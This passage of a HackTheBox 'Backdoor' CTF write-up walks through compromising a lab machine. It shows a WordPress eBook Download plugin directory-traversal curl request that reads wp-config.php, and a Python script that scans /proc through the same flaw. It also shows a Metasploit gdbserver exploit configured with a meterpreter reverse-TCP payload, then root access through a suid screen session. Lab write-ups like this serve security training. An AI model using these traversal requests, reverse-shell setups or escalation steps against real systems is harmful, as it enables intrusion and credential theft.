</span></span><span style="display:flex"><span>/wp-includes/Text/Diff/Engine/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1607<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/Text/Diff/Renderer/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1012<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/theme-compat/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2646<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/wlwmanifest.xml <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1045<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-links-opml.php    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 223<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-mail.php          <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2616<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-login.php         <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 5674<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/xmlrpc.php           <span style="color:#f92672">(</span>Status: 405<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 42<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-trackback.php     <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 135<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>2021/11/21 13:58:13 Finished
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span></code></pre></div><p>If we list the plugins, we see the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span><span style="color:#f92672">[</span>DIR<span style="color:#f92672">]</span>	ebook-download/	2021-11-10 14:18	-
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>   <span style="color:#f92672">]</span>	hello.php	2019-03-18 17:19	2.5K
</span></span></code></pre></div><p>There is a <code>hello.php</code> file and an <code>ebook-download</code> plugin.</p><h1 id="getting-the-foothold">Getting the foothold<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-foothold">#</a></h1><p>We can access <code>/wp-content/plugins/ebook-download/readme.txt</code> to check the
plugin’s version, which is 1.1 (<code>Stable tag: 1.1</code>). If we google a bit about this,
we can find a vulnerability for that version.</p><p></p><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://www.exploit-db.com/exploits/39575"><div><div class="bookmark-title">OffSec’s Exploit Database Archive</div><div class="bookmark-description">WordPress Plugin eBook Download 1.1 - Directory Traversal.. webapps exploit for PHP platform</div><div class="bookmark-link"><div>https://www.exploit-db.com/exploits/39575</div></div></div><div class="bookmark-image"><img src="https://www.exploit-db.com/images/spider-orange.png" alt="" loading="lazy"/></div></a></div>According to the exploit, we can traverse the directories and access any file in
the system:<p></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>curl <span style="color:#e6db74">&#39;&lt;http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php&gt;&#39;</span>
</span></span></code></pre></div><p>And we will get the <code>wp-config.php</code>. We can see some passwords and seeds, but none
of those help us get into <code>wp-admin</code>.</p><p>After a <strong>lot of time</strong> trying to get into <code>wp-admin</code> (I even tried to perform a
dictionary attack with <code>wpxploit</code>), I decided to investigate more the port 1337
(maybe that’s why the machine is named backdoor).</p><p>We don’t have a reverse shell yet, so we can’t just show the used ports and the
processes. Wait… we actually can but in an uncommon way: the <code>proc</code> filesystem.</p><p>The <code>proc</code> filesystem shows processes info, which can help us find which process
is using the 1337 port. In order to do that, we will need to scan all the PIDs
(as we don’t know which one to look at), so I will be using a python script for
that.</p><p>At first I tried to test the <code>/proc/PID/net/tcp</code> file of each process, but it
seems like it is a shared file (it has the same content of <code>/proc/net/tcp</code>). In
this file we can see the used ports in hexadecimal (<code>00000000:0539 -&gt; 0.0.0.0:1337</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>sl local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode
</span></span><span style="display:flex"><span>0: 0100007F:8124 00000000:0000 0A 00000000:00000000 00:00000000 <span style="color:#ae81ff">00000000</span>   <span style="color:#ae81ff">113</span>        <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">35896</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">100</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span>1: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 <span style="color:#ae81ff">00000000</span>   <span style="color:#ae81ff">113</span>        <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">35898</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">100</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span>2: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 <span style="color:#ae81ff">00000000</span>   <span style="color:#ae81ff">101</span>        <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">33011</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">100</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span>3: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 <span style="color:#ae81ff">00000000</span>     <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">33687</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">100</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span>4: 00000000:0539 00000000:0000 0A 00000000:00000000 00:00000000 <span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">1000</span>        <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">195237</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">100</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span>5: 0D67810A:BAE8 01010101:0035 <span style="color:#ae81ff">02</span> 00000001:00000000 01:000000D6 <span style="color:#ae81ff">00000002</span>   <span style="color:#ae81ff">101</span>        <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">271782</span> <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">400</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">7</span>
</span></span></code></pre></div><p>Then, I tried scanning all the <code>/proc/PID/fd/number</code> to check which process had
that port used, but without any result.</p><p>I ended up checking the <code>cmdline</code> file to show the command executed to run the process, and filtered the ones which contained the port (as we usually run the cli applications with the address as parameter).</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="display:flex"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#75715e"># curl &#39;&lt;http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=FILE&gt;&#39;</span>
</span></span><span style="display:flex"><span>baseUrl <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=&gt;&#39;</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#75715e"># Clear the results (some weird output from ebook-download)</span>
</span></span><span style="display:flex"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">req</span>(file):
</span></span><span style="display:flex"><span>    x <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>baseUrl<span style="color:#e6db74">}{</span>file<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex"><span>    req_text <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>text
</span></span><span style="display:flex"><span>    filtered_req <span style="color:#f92672">=</span> req_text<span style="color:#f92672">.</span>lstrip(check_file)<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#39;&lt;script&gt;window.close()&lt;/script&gt;&#39;</span>)
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">return</span> filtered_req
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#66d9ef">for</span> pid <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">50000</span>):
</span></span><span style="display:flex"><span>    check_file <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/proc/</span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">/cmdline&#34;</span>
</span></span><span style="display:flex"><span>    res <span style="color:#f92672">=</span> req(check_file)
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">if</span> res <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>:
</span></span><span style="display:flex"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;1337&#34;</span> <span style="color:#f92672">in</span> res:
</span></span><span style="display:flex"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found possible process </span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74"> with cmd:&#34;</span>)
</span></span><span style="display:flex"><span>            print(res)
</span></span></code></pre></div><p>After running it, we get the following result:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>Found possible process <span style="color:#ae81ff">956</span> with cmd:
</span></span><span style="display:flex"><span>bin/sh-cwhile true;<span style="color:#66d9ef">do</span> su user -c <span style="color:#e6db74">&#34;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;&#34;</span>; <span style="color:#66d9ef">done</span>
</span></span></code></pre></div><h1 id="getting-the-user-flag">Getting the user flag<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-user-flag">#</a></h1><p>It is a <code>gdbserver</code>. It is known that you can run host commands through some
debugging tools, such as the python or php ones. So I googled about this and
found the following exploit:</p><p></p><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="http://jbremer.org/turning-arbitrary-gdbserver-sessions-into-rce/"><div><div class="bookmark-title">Turning arbitrary GDBserver sessions into RCE | Development &amp; Security</div><div class="bookmark-description"></div><div class="bookmark-link"><div>http://jbremer.org/turning-arbitrary-gdbserver-sessions-into-rce/</div></div></div><div class="bookmark-image"></div></a></div>It shows a shellcode that can be injected through <code>gdb</code> to get a reverse shell.
Although, there is a <code>metasploit</code> for performing this exploit, so I won’t be
covering the steps to do it manually.<p></p><p></p><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://www.rapid7.com/db/modules/exploit/multi/gdb/gdb_server_exec/"><div><div class="bookmark-title">GDB Server Remote Payload Execution</div><div class="bookmark-description">Rapid7&#39;s VulnDB is curated repository of vetted computer software exploits and exploitable vulnerabilities.</div><div class="bookmark-link"><div>https://www.rapid7.com/db/modules/exploit/multi/gdb/gdb_server_exec/</div></div></div><div class="bookmark-image"><img src="https://www.rapid7.com/globalassets/rapid7-og.jpg" alt="" loading="lazy"/></div></a></div>I configured it like this:<p></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>msf exploit<span style="color:#f92672">(</span>gdb_server_exec<span style="color:#f92672">)</span> &gt; show options
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Module options <span style="color:#f92672">(</span>exploit/multi/gdb/gdb_server_exec<span style="color:#f92672">)</span>:
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>   Name      Current Setting  Required  Description
</span></span><span style="display:flex"><span>   ----      ---------------  --------  -----------
</span></span><span style="display:flex"><span>   EXE_FILE  /bin/true        no        The exe to spawn when gdbserver is not attached to a process.
</span></span><span style="display:flex"><span>   RHOSTS    backdoor.htb     yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see &lt;https://github.com/rapid7/metasploit-framewo&gt;
</span></span><span style="display:flex"><span>                                        rk/wiki/Using-Metasploit
</span></span><span style="display:flex"><span>   RPORT     <span style="color:#ae81ff">1337</span>             yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Payload options <span style="color:#f92672">(</span>linux/x64/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>   Name   Current Setting  Required  Description
</span></span><span style="display:flex"><span>   ----   ---------------  --------  -----------
</span></span><span style="display:flex"><span>   LHOST  10.10.14.187     yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>   LPORT  <span style="color:#ae81ff">6666</span>             yes       The listen port
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Exploit target:
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>   Id  Name
</span></span><span style="display:flex"><span>   --  ----
</span></span><span style="display:flex"><span>   <span style="color:#ae81ff">1</span>   x86_64 <span style="color:#f92672">(</span>64-bit<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>msf exploit<span style="color:#f92672">(</span>gdb_server_exec<span style="color:#f92672">)</span> &gt; exploit
</span></span></code></pre></div><p>After running it, we get a <code>meterpreter</code> shell, which can be converted into a
normal one using the shell command:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>meterpreter &gt; shell
</span></span><span style="display:flex"><span>Process <span style="color:#ae81ff">7509</span> created.
</span></span><span style="display:flex"><span>Channel <span style="color:#ae81ff">1</span> created.
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>id
</span></span><span style="display:flex"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style="display:flex"><span>user@Backdoor:~$
</span></span><span style="display:flex"><span>user@Backdoor:~$ export TERM<span style="color:#f92672">=</span>xterm
</span></span></code></pre></div><p>And we can get the <strong>user flag</strong>!</p><h1 id="privilege-escalation">Privilege escalation<a hidden="" class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1><p>After some enumeration, I listed all the files with the <code>suid</code> bit activated.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>user@Backdoor:~$ find / -type f -perm -u<span style="color:#f92672">=</span>s 2&gt;/dev/null
</span></span><span style="display:flex"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style="display:flex"><span>/usr/lib/eject/dmcrypt-get-device
</span></span><span style="display:flex"><span>/usr/lib/policykit-1/polkit-agent-helper-1
</span></span><span style="display:flex"><span>/usr/lib/openssh/ssh-keysign
</span></span><span style="display:flex"><span>/usr/bin/passwd
</span></span><span style="display:flex"><span>/usr/bin/chfn
</span></span><span style="display:flex"><span>/usr/bin/gpasswd
</span></span><span style="display:flex"><span>/usr/bin/at
</span></span><span style="display:flex"><span>/usr/bin/su
</span></span><span style="display:flex"><span>/usr/bin/sudo
</span></span><span style="display:flex"><span>/usr/bin/newgrp
</span></span><span style="display:flex"><span>/usr/bin/fusermount
</span></span><span style="display:flex"><span>/usr/bin/screen
</span></span><span style="display:flex"><span>/usr/bin/umount
</span></span><span style="display:flex"><span>/usr/bin/mount
</span></span><span style="display:flex"><span>/usr/bin/chsh
</span></span><span style="display:flex"><span>/usr/bin/pkexec
</span></span></code></pre></div><p>We can see there is a <code>screen</code> executable, which is owned by root.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">474280</span> Feb <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> /usr/bin/screen
</span></span></code></pre></div><p><code>screen</code> is like a terminal multiplexer. We can see the sessions listed in the
folder <code>/run/screen</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>user@Backdoor:~$ ls /run/screen
</span></span><span style="display:flex"><span>S-root  S-user
</span></span></code></pre></div><p>And it seems like root is running its own. You can easily connect to a user with <code>screen -x youruser/</code>. So we can run it with root (as the <code>suid</code> bit is activated):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>screen -x root/
</span></span><span style="display:flex"><span>root@Backdoor:~# id
</span></span><span style="display:flex"><span>id
</span></span><span style="display:flex"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>and get a <strong>root shell</strong>. Now you can get the <strong>root flag</strong>!</p><h1 id="conclusion">Conclusion<a hidden="" class="anchor" aria-hidden="true" href="#conclusion">#</a></h1><p>Getting the foothold in this machine was quite frustrating for me. I never did a
<em>Wordpress</em> pentest, but it makes a lot of sense to pay attention to the plugins,
as <em>Wordpress</em> is developed by a bigger company and it is easier for a plugin
developer to introduce a bug.</p><p>Also, I was lucky with the <code>proc</code> method, because most of the ports are configured
nowadays with <code>env</code> or config files. To be honest, I wouldn’t consider the user
easy. Although, the root was pretty straitforward if you looked for what you had
to look for.</p><h1 id="references">References<a hidden="" class="anchor" aria-hidden="true" href="#references">#</a></h1><ul><li>Important Wordpress files<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#basic-information"><div><div class="bookmark-title">Page not found - HackTricks</div><div class="bookmark-description"></div><div class="bookmark-link"><div>https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#basic-information</div></div></div><div class="bookmark-image"></div></a></div></li><li><code>wpxploit</code> (Directory Attack credentials)<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://github.com/relarizky/wpxploit"><div><div class="bookmark-title">GitHub - relarizky/wpxploit: Simple Python Script For Performing XMLRPC Dictionary Attack</div><div class="bookmark-description">Simple Python Script For Performing XMLRPC Dictionary Attack - relarizky/wpxploit</div><div class="bookmark-link"><div>https://github.com/relarizky/wpxploit</div></div></div><div class="bookmark-image"><img src="https://opengraph.githubassets.com/7884d0b48602cd3b6a7e85b71d56e5449811b29d2654f7fe62fdf9f01caa4436/relarizky/wpxploit" alt="" loading="lazy"/></div></a></div></li><li><code>proc</code> filesystem<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://web.mit.edu/rhel-doc/5/RHEL-5-manual/Deployment_Guide-en-US/ch-proc.html"><div><div class="bookmark-title">Page Not Found | MIT - Massachusetts Institute of Technology</div><div class="bookmark-description"></div><div class="bookmark-link"><div>https://web.mit.edu/rhel-doc/5/RHEL-5-manual/Deployment_Guide-en-US/ch-proc.html</div></div></div><div class="bookmark-image"></div></a></div></li><li>Remote Code Execution in <code>gdbserver</code><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="http://jbremer.org/turning-arbitrary-gdbserver-sessions-into-rce/"><div><div class="bookmark-title">Turning arbitrary GDBserver sessions into RCE | Development &amp; Security</div><div class="bookmark-description"></div><div class="bookmark-link"><div>http://jbremer.org/turning-arbitrary-gdbserver-sessions-into-rce/</div></div></div><div class="bookmark-image"></div></a></div></li></ul></div><footer class="post-footer"><ul class="post-tags"><li><a href="https://xzebra.dev/tags/cybersecurity/">cybersecurity</a></li><li><a href="https://xzebra.dev/tags/ctf/">ctf</a></li><li><a href="https://xzebra.dev/tags/linux/">linux</a></li><li><a href="https://xzebra.dev/tags/hackthebox/">hackthebox</a></li></ul><div class="share-buttons"><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Backdoor on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20Writeup%3a%20Backdoor&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_backdoor%2f&amp;hashtags=cybersecurity%2cctf%2clinux%2chackthebox"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Backdoor on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_backdoor%2f&amp;title=HackTheBox%20Writeup%3a%20Backdoor&amp;summary=HackTheBox%20Writeup%3a%20Backdoor&amp;source=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_backdoor%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Backdoor on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_backdoor%2f&amp;title=HackTheBox%20Writeup%3a%20Backdoor"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Backdoor on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_backdoor%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Backdoor on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20Writeup%3a%20Backdoor%20-%20https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_backdoor%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 